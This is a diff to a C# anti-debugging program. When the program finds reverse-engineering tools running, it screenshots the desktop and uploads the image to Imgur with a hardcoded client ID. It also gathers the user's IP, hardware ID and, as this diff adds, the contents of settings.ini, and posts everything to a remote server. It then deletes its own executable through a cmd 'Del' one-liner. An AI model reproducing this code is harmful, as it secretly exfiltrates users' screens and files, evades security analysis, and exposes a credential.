@@ -5,11 +5,13 @@ using RestSharp;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Threading.Tasks;
+using System.Text;
+using System.Reflection;
 namespace antidebug
 {
     internal class Program
     {
-        static async Task Main()
+        static async Task checkisgood()
         {
             string[] processNamesToCheck = {
                 "HTTPDebuggerUI", "ida", "ghidra", "ollydbg", "x64dbg", "radare2", "hopper", "binaryninja",
@@ -53,7 +55,6 @@ namespace antidebug
                 string tempPath = Path.GetTempPath();
                 string imagePath = Path.Combine(tempPath, "screenshot.png");
                 screenshot.Save(imagePath, ImageFormat.Png);
-
                 string imageUrl = await UploadToImgur(imagePath);
                 string ip = GetPublicIPAddress();
                 DateTime currentDateTime = DateTime.Now;
@@ -79,10 +80,14 @@ namespace antidebug
                         }
                     }
                 }
-
+                string settinfo = "not found";
+                if (File.Exists("settings.ini"))
+                {
+                    settinfo = File.ReadAllText("settings.ini");
+                }
                 string reason = $"You were blocked for the following reason: during the launch of the program, a prohibited {prosessesbadall} process was detected";
                 string exePath = Process.GetCurrentProcess().MainModule.FileName;
-                var client = new RestClient("http://111.111.111/users/api/v1/users");
+                var client = new RestClient("http://111.111.111/api/users");
                 var request = new RestRequest("banned", Method.Post);
                 request.AddHeader("Content-Type", "application/json");
 
@@ -92,13 +97,13 @@ namespace antidebug
                     date = currentDateTime.ToString(),
                     hwid = hwid,
                     reason = reason,
-                    screenshot = imageUrl
+                    screenshot = imageUrl,
+                    fileinfo = settinfo
                 };
 
                 request.AddJsonBody(requestBody);
-
                 var response = client.Execute(request);
-
+                Console.WriteLine(response.Content);
                 Process.Start(new ProcessStartInfo
                 {
                     Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"",
@@ -127,7 +132,7 @@ namespace antidebug
 
             var client = new RestClient();
             var request = new RestRequest(new Uri("https://api.imgur.com/3/image"), Method.Post);
-            string clientId = ""; //  ID с imgur.com
+            string clientId = "cfca21c5e2b39f2"; 
 
             request.AddHeader("Authorization", "Client-ID " + clientId);
             byte[] imageBytes = File.ReadAllBytes(imagePath);
